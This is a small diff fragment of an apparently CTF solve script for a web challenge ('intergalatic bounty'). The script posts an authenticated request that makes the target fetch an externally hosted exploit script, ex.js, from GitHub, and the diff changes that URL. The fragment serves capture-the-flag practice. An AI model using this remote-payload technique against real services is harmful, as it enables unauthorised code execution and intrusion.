@@ -92,7 +92,7 @@ console.log(await fetch(`${urlWebapp}/api/transmit`, {
     "content-type": "application/json",
     "Cookie": `auth=${login.token}`,
   },
-  "body": JSON.stringify({ url: "https://raw.githubusercontent.com/vladpopescu0/ctf/refs/heads/main/ex.js" }),
+  "body": JSON.stringify({ url: "https://raw.githubusercontent.com/vladpopescu0/ctf/refs/heads/main/writeups/University_CTF_2024_Binary_Badlands/web_intergalatic_bounty/ex.js" }),
   "method": "POST",
 }).then(res => res.text()));
 
